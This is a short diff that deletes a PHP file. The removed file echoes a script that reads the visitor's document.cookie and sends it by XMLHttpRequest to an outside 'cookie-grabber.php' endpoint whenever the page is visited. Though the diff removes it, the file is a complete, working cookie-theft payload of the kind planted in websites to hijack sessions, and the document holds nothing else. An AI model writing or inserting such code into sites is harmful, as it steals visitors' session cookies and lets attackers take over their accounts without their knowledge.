@@ -1,9 +1,0 @@
-<?php
-// This script will execute when the user visits it
-echo "<script>
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', 'https://dishant4081.github.io/cookie-grabber.php?cookies=' + encodeURIComponent(document.cookie), true);
-    xhr.send();
-</script>";
-?>
-
